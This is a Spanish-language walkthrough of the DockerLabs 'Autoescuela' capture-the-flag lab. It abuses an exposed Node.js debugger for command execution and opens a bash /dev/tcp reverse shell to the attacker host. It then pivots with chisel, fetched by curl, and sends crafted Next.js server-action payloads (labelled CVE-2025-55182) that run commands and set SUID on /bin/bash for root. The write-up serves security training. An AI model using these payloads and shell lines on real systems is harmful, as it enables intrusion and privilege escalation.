### Autoescuela-DockerLabs🇪🇸

#### 1. Primero debemos de descomprimir el archivo y lo moveremos a nuestra zona de trabajo.
```bash
unzip autoescuela.zip 
```

<img width="923" height="201" alt="image" src="https://github.com/user-attachments/assets/6e16dbc4-2ae3-4b4e-b81f-8121191f97cc" />


#### 1.2 Ahora procedemos a encender el laboratorio.
```bash
sudo bash ./auto_deploy.sh autoescuela.tar 
```

<img width="925" height="389" alt="image" src="https://github.com/user-attachments/assets/66bc2314-6095-47d8-863e-83d5cce5d412" />


#### 1.3 Vamos a realizar un ping para comprobar la conexión.
```bash
 ping -c3 172.17.0.2
```

<img width="694" height="162" alt="image" src="https://github.com/user-attachments/assets/11ff8ff2-b183-4bcb-8b34-92e55d613c81" />


#### 2. Ahora rastrearemos los puertos que están abiertos.
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

<img width="914" height="442" alt="image" src="https://github.com/user-attachments/assets/c00289d2-03e3-4ebb-bb16-a49634eeef00" />

*Veremos que en el puerto 8080 no hay nada interesante para ejecutar y pasaremos al otro*


#### 3. Ahora realizaremos un escaneo de direcotrios abiertos mediante gobuter.
```bash
 gobuster dir -u http://172.17.0.2:9229/ \
                                 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
                                 -x env,php,bak,old,zip,txt \
                                 -b 400,403,404 \
                                 --exclude-length 33
```

<img width="919" height="484" alt="image" src="https://github.com/user-attachments/assets/f4353e62-92b2-4da8-862d-534e1674441c" />


#### 4. Entraremos en la web y veremos un archivo node sabiendo que hay  presencia activa del servicio de depuración de Node.js y que podemos comprometerlo.

<img width="994" height="400" alt="image" src="https://github.com/user-attachments/assets/6ca07022-d911-447c-9b3b-e400854eaad1" />

#### 4.2 Ahora procederemos a entrar en la consola de node.
```bash
 node inspect 172.17.0.2:9229 
```

<img width="609" height="45" alt="image" src="https://github.com/user-attachments/assets/2c722ca6-4aef-4d54-b2a8-11a34a8c89d4" />


#### 4.3 Ahora veremos las versiones que están presentes.
```bash
exec('process.versions')
```

#### 4.4 Haremos una ejecución nativa.
```bash
exec('const spawn = process.binding("spawn_sync"); const result = spawn.spawn({file:"/bin/sh",args:["/bin/sh","-c","id"],stdio:[{type:"pipe",readable:true,writable:false},{type:"pipe",readable:false,writable:true},{type:"pipe",readable:false,writable:true}],envPairs:[]}); result.output[1]')
```

<img width="920" height="100" alt="image" src="https://github.com/user-attachments/assets/a84f3699-0aba-4f10-8a83-4b084ea0e3f3" />


#### 4.5 Procedemos a realizar una inyección en el prototipo global.
```bash
exec('Object.prototype.require = function(m) { return process.mainModule.require(m) }')
```

<img width="917" height="42" alt="image" src="https://github.com/user-attachments/assets/35160012-d5ee-4657-889f-a70afd1ab18c" />


#### 4.6 Ahora iniciaremos una verificación para ver si existe la persistencia de la contaminación.
```bash
exec('Object.prototype.polluted = "yes"; polluted')
```

<img width="781" height="43" alt="image" src="https://github.com/user-attachments/assets/f679533f-cbcc-4f83-b5cc-dd405a2921c3" />


#### 4.7 Ejecutaremos los comandos mediante bypass.
```bash
exec('({}).require("child_process").execSync("id").toString()')
```

<img width="783" height="61" alt="image" src="https://github.com/user-attachments/assets/3f79e1e3-639a-4edb-ae4b-bcbdad456d48" />


#### 4.8 Empezaremos a escuchar mediante otra terminal
```bash
sudo nc -lvnp 4445
```

<img width="924" height="121" alt="image" src="https://github.com/user-attachments/assets/2ee2a84e-cc00-4422-894a-c73d7196752f" />


#### 4.9 Ahora trasmitimos el payload para que se escuche desde el netcast.
```bash
exec('({}).require("child_process").execSync("bash -c \'bash -i >& /dev/tcp/172.17.0.1/4445 0>&1\'")')```
```

<img width="921" height="180" alt="image" src="https://github.com/user-attachments/assets/bed2dc46-296f-459e-90b5-033032547d0f" />


#### 5. Ahora que ha funcionado la reverse shell debemos de escalar privilegios. 

### User Flag

<img width="700" height="347" alt="image" src="https://github.com/user-attachments/assets/a40833ce-6e73-4203-9660-ad25b4129ac9" />


#### 6. Veremos ahora con `find / -perm -4000 -type f 2>/dev/null` que binarios podemos moificar


<img width="771" height="222" alt="image" src="https://github.com/user-attachments/assets/9e361e22-c06c-48e2-b8dd-b6557e374efd" />


#### 7. Ahora veremos cuantos servicios están escuchando internamente.
```bash
netstat -tuln
```

<img width="860" height="138" alt="image" src="https://github.com/user-attachments/assets/0bb0500f-ff9f-4e18-bc5b-6dabf20e814d" />


#### 8. Vamos a utilizar el expoit chissel. https://github.com/jpillora/chisel/releases

##### 8.1 Lo prepararemos.
```bash
# Descomprimir
gunzip -d chisel_1.11.5_linux_amd64.gz

# Dar permisos
chmod +x chisel_1.11.5_linux_amd64

#Renombrar 
mv chisel_1.11.5_linux_amd64 Chisel
```

<img width="913" height="92" alt="image" src="https://github.com/user-attachments/assets/176f1e63-618c-4e26-a558-739c62084e33" />


#### 8.2 Vamos a compartir el ejecutivo a nuestra máquina 
```bash
 sudo python3 -m http.server 80
```

<img width="811" height="138" alt="image" src="https://github.com/user-attachments/assets/be3e53f1-99fb-4985-82d8-a1d158c1ba2d" />


#### 8.3 Desde la reverse shell debemos de recibir el paquete.
```bash
cd /tmp
curl -O http://172.17.0.1:8080/chisel
```

<img width="926" height="585" alt="image" src="https://github.com/user-attachments/assets/35cb38cb-a200-4ad5-a6b2-fce7f4f2a1c5" />


#### 8.4 Ahora le daremos permisos
```bash
chmod +x chisel
```

<img width="620" height="60" alt="image" src="https://github.com/user-attachments/assets/2491c11e-7fb2-42a9-a489-0c82a2cb5b06" />


#### 8.5 Ahora lanzamos el paquete a la escucha desde la máquina.
```bash
# en kali
 ./Chisel server -p 9000 --reverse

# en webuser
./chisel client 172.17.0.1:9000 R:3001:127.0.0.1:3000
```

<img width="914" height="709" alt="image" src="https://github.com/user-attachments/assets/534ec445-c2e6-4921-8d6f-9295c34bb9aa" />


#### 8.6 De está manera podremos interactuar directamente en la web.

<img width="1019" height="637" alt="image" src="https://github.com/user-attachments/assets/6c06b2a7-d276-47ed-b836-1dd5e6150c60" />


#### 8.7 Utilizaremos us exploit creado por un tercero. 
**https://github.com/Alejandro609x/JEFAZO-CVE-2025-55182-Checker**
```bash
python3 Scan_cve_2025_55182.py 
# http://127.0.0.1:3001/ 
```

<img width="932" height="999" alt="image" src="https://github.com/user-attachments/assets/3e62a193-3ec7-4454-b8ae-9ab25b000588" />


 #### 8.8  Procedemos a enviar solicitudes manipuladas en el curl.
 ```bash
curl -X POST http://localhost:3001/ \
     -H "Content-Type: multipart/form-data; boundary=----Boundary" \
     -H "Next-Action: test" \
     -H "Accept: text/x-component" \
     --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"process.mainModule.require(\'child_process\').execSync(\'id\').toString()","_formData":{"get":"$1:constructor:constructor"}}}\r\n------Boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------Boundary--\r\n'
```

<img width="912" height="262" alt="image" src="https://github.com/user-attachments/assets/6beea58d-4ecb-4846-991c-31f7bb8d11a7" />


#### 8.9 Nos hemos preparado el terreno para convertirnos en Root permanente dentro del contenedor.
```bash
# en una terminal kali
echo "bash -p -i >& /dev/tcp/172.17.0.1/4446 0>&1" | base64
nc -lvnp 4446

# en kali terminal otra

curl -X POST http://localhost:3001/ \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -H "Next-Action: test" \
  -H "Accept: text/x-component" \
  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"process.mainModule.require(\'child_process\').execSync(\'chmod u+s /bin/bash\').toString()","_formData":{"get":"$1:constructor:constructor"}}}\r\n------Boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------Boundary--\r\n'
```

<img width="899" height="794" alt="image" src="https://github.com/user-attachments/assets/ee2b246a-528b-4c47-ac00-72027508dd5a" />


### Conseguimos la ROOT Flag.

<img width="924" height="226" alt="image" src="https://github.com/user-attachments/assets/0865f92d-a27f-45b3-afb9-fece66c3a71f" />

























